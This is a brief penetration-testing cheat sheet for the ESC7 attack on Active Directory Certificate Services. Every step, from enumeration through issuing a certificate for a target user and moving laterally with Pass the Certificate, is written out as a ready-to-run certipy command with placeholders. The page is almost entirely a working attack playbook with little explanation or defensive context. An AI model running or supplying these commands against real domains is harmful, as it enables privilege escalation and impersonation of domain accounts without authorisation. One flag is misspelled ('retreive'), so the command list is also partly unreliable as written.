# ESC7 - Vulnerable Certificate Authority Access Control

## Enumeration

 - certipy find -u USER@DOMAIN -p PASSWORD -dc-ip DOMAIN_CONTROLLER

## Exploitation

 - certipy ca -ca CA_NAME -add-officer 'USER' -username USER@DOMAIN -password PASSWORD (Manage CA)

 - certipy ca -ca CA_NAME -enable-template 'ESC1_VULN_TEMPLATE' -username USER@DOMAIN -password PASSWORD (Manage certificate. You can skip Step 1 if we find the vuln certificate.)

 - certipy req -username USER@DOMAIN -password PASSWORD -ca CA_NAME -template 'VULNERABLE_TEMPLATE_NAME' -upn 'TARGET_USER' (Error, but save private key)

### Issue request

 - certipy ca -u USER@DOMAIN -p 'PASSWORD' -ca CA_NAME -issue-request REQUEST_ID

 - certipy req -u USER@DOMAIN -p 'PASSWORD' -ca CA_NAME -retreive REQUEST_ID

### We move laterally with Pass the Certificate 
